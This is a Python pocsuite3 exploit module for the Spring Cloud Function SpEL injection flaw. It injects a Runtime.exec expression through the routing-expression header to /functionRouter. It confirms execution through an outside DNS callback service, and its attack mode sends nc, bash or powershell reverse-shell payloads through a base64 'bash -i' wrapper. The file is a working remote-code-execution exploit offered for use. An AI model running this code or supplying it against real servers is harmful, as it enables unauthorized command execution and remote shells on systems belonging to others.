# !/usr/bin/env python
# -*- coding: UTF-8 -*-
import json
import time
import base64
from collections import OrderedDict
from json import dumps
from urllib.parse import urlparse, urljoin

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.lib.core.interpreter_option import OptDict
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class Spring_Cloud_Function_SpEL(POCBase):
    vulID = 'Spring-Cloud-Function-SpEL'
    version = '1.0'
    author = ['Warin9_0']
    vulDate = '2022-03-29'
    createDate = '2022-03-29'
    updateDate = '2022-03-29'
    references = ['']
    name = 'Spring-Cloud-Function-SpEL'
    appPowerLink = ''
    appName = 'Spring-Cloud-Function-SpEL'
    appVersion = """Spring-Cloud-Function-SpEL"""
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Spring-Cloud-Function-SpEL'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
            "powershell": REVERSE_PAYLOAD.POWERSHELL,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _check(self, url, cmd=""):
        self.timeout = 5
        Gurl = 'https://dig.pm/new_gen'
        Gdate = 'domain=dns.1433.eu.org.'
        try:
            G = requests.post(Gurl, data=Gdate, timeout=self.timeout)
            token = json.loads(G.text).get('token')
            Gdomain = json.loads(G.text).get('domain')
            path = "/functionRouter"
            vul_url = urljoin(url, path)
        except Exception:
            return False
        else:
            if cmd:
                cmd = base64.b64encode(cmd.encode('utf-8')).decode("utf-8")
                cmd = str('bash -c {echo,' + cmd + '}|{base64,-d}|{bash,-i}')
            else:
                cmd = 'ping 0_K.{}'.format(Gdomain)
            command = "T(java.lang.Runtime).getRuntime().exec(\"{cmd}\")".format(
                cmd=cmd)
            print("\033[1;31mpayload:" + cmd + '\033[0m')
            data = "rush A"
            parse = urlparse(vul_url)
            headers = {
                "Host": "{}".format(parse.netloc),
                "spring.cloud.function.routing-expression": command
            }
            try:
                r = requests.post(vul_url, headers=headers, timeout=self.timeout, data=data, verify=False)
            except Exception:
                return False
            else:
                if r.status_code == 500:
                    domain = "dns.1433.eu.org"
                    Rurl = 'https://dig.pm/get_results'
                    Rdate = 'domain=' + domain + '&' + 'token=' + token
                    headers = {
                        "Content-Type": "application/x-www-form-urlencoded"
                                }
                    time.sleep(2)
                try:
                    R = requests.post(Rurl, data=Rdate, headers=headers)
                except Exception:
                    return False
                else:
                    if Gdomain in R.text and '0_K' in R.text:
                        cmd_result = R.text
                        print("\033[1;31mtoken:" + token + '\033[0m')
                        return url, cmd_result

            return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
           # result['VerifyInfo']['COMMAND_RESULT'] = p[1]

        return self.parse_output(result)

    def _attack(self):
        result = {}
        command = self.get_option("command")
        p = self._check(self.url, cmd=command)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
           # result['VerifyInfo']['COMMAND_RESULT'] = p[1]

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('url is not vulnerable')
        return output


register_poc(Spring_Cloud_Function_SpEL)
